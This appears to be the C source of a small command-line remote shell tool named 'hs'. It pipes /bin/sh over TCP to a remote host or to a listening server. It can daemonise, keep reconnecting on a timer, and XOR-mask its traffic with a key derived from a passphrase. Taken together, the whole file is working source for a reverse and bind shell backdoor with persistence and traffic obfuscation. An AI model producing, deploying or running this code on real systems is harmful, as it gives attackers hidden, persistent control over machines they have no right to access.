
#include <getopt.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include "pipe_fd.h"
#include "anet.h"
#include "sha256.h"

#define USAGE "Usage: hs [--cmd <cmd>] [--remote <dest>] [--port <port>] [--daemon]\n" \
              "          [--attempts <n>] [--interval <secs>] [--uuid(=<uuid>)] [--loop(=<secs>)]\n" \
              "       hs [--server] [--port <port>] [--loop(=<secs>)] [--uuid(=<uuid>)]\n" \
              "       hs [--help]\n"

#define MAGIC 2993965596
#define BUF_LEN 1024

void init_sha256(char *s, uint8_t *digest) {
    context_sha256_t c;
    int magic = MAGIC;
    sha256_starts(&c);
    sha256_update(&c,(uint8_t *)&magic,(uint32_t)4);
    sha256_update(&c,(uint8_t *)s,(uint32_t)strlen(s));
    sha256_finish(&c,digest);
}

int main(int argc, char **argv) {

    char *cmd = "/bin/sh";
    char *p = NULL;
    int fd_in = 0, fd_out = 1;
    char *remote = NULL;
    char *bind = NULL;
    uint8_t xor_mask[32];
    int xor = 0;
    int port = 9876;
    int server = 0;
    int daemonise = 0;
    int interval = 300;
    int count = 0;
    int attempts = 1;
    int connected = 0;
    int loop = 0;
    int n = 0;
    char timestamp[64];
    time_t now;;
    char *buf;
    char option;
    char c;

    static struct option longopts[] = {
        { "cmd",        required_argument,  NULL, 'c' },
        { "remote",     required_argument,  NULL, 'r' },
        { "port",       required_argument,  NULL, 'p' },
        { "attempts",   required_argument,  NULL, 'a' },
        { "interval",   required_argument,  NULL, 'i' },
        { "uuid",       optional_argument,  NULL, 'u' },
        { "loop",       optional_argument,  NULL, 'l' },
        { "server",     no_argument,        NULL, 's' },
        { "daemon",     no_argument,        NULL, 'd' },
        { "bind",       required_argument,  NULL, 'b' },
        { "help",       no_argument,        NULL, 'h' },
        { NULL,         0,                  NULL, 0 }
    };

    while ((option = getopt_long(argc, argv, "c:r:p:i:u:l:a:n:sdb:h", longopts, NULL)) != -1) {
        switch(option) {
            case 'c':
                cmd = optarg;
                break;
            case 'r':
                if ((p = strchr(optarg,':')) != NULL) {
                    if ((port = strtol(p+1,(char **)NULL,10)) == 0) {
                        fprintf(stderr,"Invalid port\n");
                        exit(-1);
                    }
                    *p = 0;
                }
                remote = optarg;
                break;
            case 'p':
                if ((port = strtol(optarg,(char **)NULL,10)) == 0) {
                    fprintf(stderr,"Invalid port\n");
                    exit(-1);
                }
                break;
            case 'i':
                if ((interval = strtol(optarg,(char **)NULL,10)) == 0) {
                    fprintf(stderr,"Invalid retry interval\n");
                    exit(-1);
                }
                break;
            case 'u':
                xor = 1;
                if (optarg) {
                    init_sha256(optarg,xor_mask);
                } else {
                    if ((buf = malloc(BUF_LEN)) == NULL) {
                        fprintf(stderr,"Cant allocate memory\n");
                        exit(-1);
                    }
                    bzero(buf,1024);
                    if (isatty(fileno(stdin))) {
                        fputs("uuid> ",stdout);
                    }
                    while ((c = fgetc(stdin)) != EOF && ++n < BUF_LEN) {
                        if (c == '\n') break;
                        buf[n-1] = c;
                    }
                    init_sha256(buf,xor_mask);
                    free(buf);
                }
                break;
            case 'l':
                if (optarg) {
                    if ((loop = strtol(optarg,(char **)NULL,10)) == 0) {
                        fprintf(stderr,"Invalid loop interval\n");
                        exit(-1);
                    }
                } else {
                    loop = 60;
                }
                break;
            case 'a':
                if ((attempts = strtol(optarg,(char **)NULL,10)) == 0) {
                    fprintf(stderr,"Invalid attempts\n");
                    exit(-1);
                }
                break;
            case 's':
                server = 1;
                break;
            case 'd':
                daemonise = 1;
                break;
            case 'b':
                bind = optarg;
                break;
            case 'h':
                fprintf(stderr,USAGE);
                exit(-1);
        }
    }

    char err[ANET_ERR_LEN];
    if (server) {
        char c_ip[1024];
        int s_fd,c_fd,c_port;

        if ((s_fd = anetTcpServer(err,port,bind)) == ANET_ERR) {
            fprintf(stderr,"Error creating server: %s",err);
            exit(-1);
        }
        while (1) {
            fprintf(stderr,"--- Listening port %d\n",port);
            if ((c_fd = anetAccept(err,s_fd,c_ip,&c_port)) == ANET_ERR) {
                fprintf(stderr,"Error accepting client connection: %s",err);
                exit(-1);
            }
            now = time(NULL);
            strftime(timestamp,64,"%F %T",localtime(&now));
            fprintf(stderr,"--- Connection from: %s port %d [%s]\n",c_ip,c_port,timestamp);
            int fds[4] = {0,1,c_fd,c_fd};
            select_fds(fds,xor ? xor_mask : NULL);
            fprintf(stderr,"--- Disconnected\n");
            if (!loop) {
                break;
            }
        }
    } else {
        if (daemonise) {
            if (daemon(0,0) == -1) {
                perror("Daemon error");
                exit(-1);
            }
        }
        while(1) {
            if (remote) {
                count = 0;
                while (1) {
                    if (count++ > 0) {
                        sleep(interval);
                    }
                    fprintf(stderr,"--- Connecting - attempt %d\n",count);
                    if ((fd_in = fd_out = anetTcpConnect(err,remote,port)) != ANET_ERR) {
                        connected = 1;
                        break;
                    }
                    if (count >= attempts) {
                        break;
                    }
                }
            } else {
                connected = 1;
            }
            if (connected) {
                pipe_fd_select(cmd,fd_in,fd_out,xor ? xor_mask : NULL);
                connected = 0;
            }
            if (loop == 0) {
                break;
            }
            sleep(loop);
        }
    }
    return 0;
}
